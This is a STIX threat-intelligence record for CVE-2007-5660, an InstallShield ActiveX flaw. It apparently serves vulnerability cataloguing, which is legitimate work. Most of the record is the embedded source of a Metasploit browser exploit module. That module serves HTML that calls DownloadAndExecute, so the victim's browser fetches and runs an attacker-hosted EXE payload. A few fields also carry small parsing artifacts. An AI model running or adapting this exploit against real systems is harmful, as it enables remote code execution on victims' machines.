{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--542c9f5c-0612-46ae-a740-a4b9da55ce2d",
    "created": "2024-08-14T16:44:59.928035Z",
    "modified": "2024-08-14T16:44:59.928039Z",
    "name": "Macrovision InstallShield Update Service ActiveX Unsafe Method",
    "description": " This module allows attackers to execute code via an unsafe method in Macrovision InstallShield 2008.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/macrovision_unsafe.rb",
            "external_id": "macrovision_unsafe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5660"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Macrovision InstallShield Update Service ActiveX Unsafe Method',\n      'Description'    => %q{\n        This module allows attackers to execute code via an unsafe method in Macrovision InstallShield 2008.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5660' ],\n          [ 'OSVDB', '38347' ],\n          [ 'BID', '26280' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-10-20'))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/payload\"\n\n    if (request.uri.match(/payload/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending EXE payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    vname  = rand_text_alpha(rand(100) + 1)\n    exe    = rand_text_alpha(rand(20) + 1)\n\n    content = %Q|\n      <html>\n        <object classid='clsid:E9880553-B8A7-4960-A668-95C68BED571E' id='#{vname}'></object>\n        <script language='JavaScript'>\n          #{vname}.Initialize(\"#{vname}\",\"#{vname}\",\"\",\"\");\n          #{vname}.DownloadAndExecute(\"\",\"\",1,\"#{payload_url}/#{exe}.exe\",\"\");\n          #{vname}.DownloadAndInstall(\"True\");\n        </script>\n      </html>\n            |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-20",
    "x_mitre_platforms": [
        "win'"
    ]
}